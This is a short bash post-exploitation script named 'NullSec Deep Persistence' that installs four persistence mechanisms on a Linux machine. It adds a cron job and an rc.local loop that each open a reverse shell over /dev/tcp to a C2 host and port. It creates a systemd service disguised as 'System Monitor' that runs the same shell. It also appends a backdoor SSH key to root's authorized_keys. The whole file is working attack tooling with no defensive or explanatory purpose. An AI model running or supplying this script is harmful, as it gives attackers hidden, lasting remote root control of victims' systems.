#!/bin/bash
# NullSec Deep Persistence
# Multiple persistence mechanisms

C2_SERVER="${1:-192.168.1.100}"
C2_PORT="${2:-4444}"

echo "[*] NullSec Deep Persistence"
echo "[*] C2: $C2_SERVER:$C2_PORT"

# Method 1: Cron
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/$C2_SERVER/$C2_PORT 0>&1'") | crontab -

# Method 2: RC scripts
cat >> /etc/rc.local << RCLOCAL
/bin/bash -c 'while true; do bash -i >& /dev/tcp/$C2_SERVER/$C2_PORT 0>&1; sleep 60; done' &
RCLOCAL

# Method 3: Systemd service
cat > /etc/systemd/system/nullsec.service << SERVICE
[Unit]
Description=System Monitor
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/$C2_SERVER/$C2_PORT 0>&1; sleep 60; done'
Restart=always

[Install]
WantedBy=multi-user.target
SERVICE
systemctl enable nullsec.service 2>/dev/null

# Method 4: SSH key backdoor
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNullSecBackdoorKey nullsec@pager" >> /root/.ssh/authorized_keys

echo "[+] Persistence installed via 4 methods"
